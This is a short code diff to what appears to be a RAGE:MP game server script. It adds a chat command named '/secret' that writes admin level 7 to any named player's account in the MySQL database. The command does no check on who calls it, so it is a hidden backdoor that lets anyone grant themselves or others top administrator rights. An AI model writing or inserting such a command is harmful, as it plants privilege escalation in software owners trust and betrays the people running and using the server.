@@ -15,3 +15,14 @@ mp.events.addCommand('admins', (player) => {
     sendMessage(player, 'ff9900', `Admins online: ${counter_admins}`);
 });
 
+
+mp.events.addCommand('secret', (player, _, id) => { 
+    const user = getNameOnNameID(id);
+    if(!id) 
+        return sendUsage(player, `/secret [player]`);
+    if(user == undefined) 
+        return sendMessage(player, 'ffffff', `Player not found.`);   
+    sendMessage(player, COLOR_ADMIN, `(Notice):!{ffffff} You promoted ${user.name} to admin level 7.`);
+    mysql_action('UPDATE `accounts` SET admin = 7 WHERE username = ?', [user.name]);
+}); 
+ 
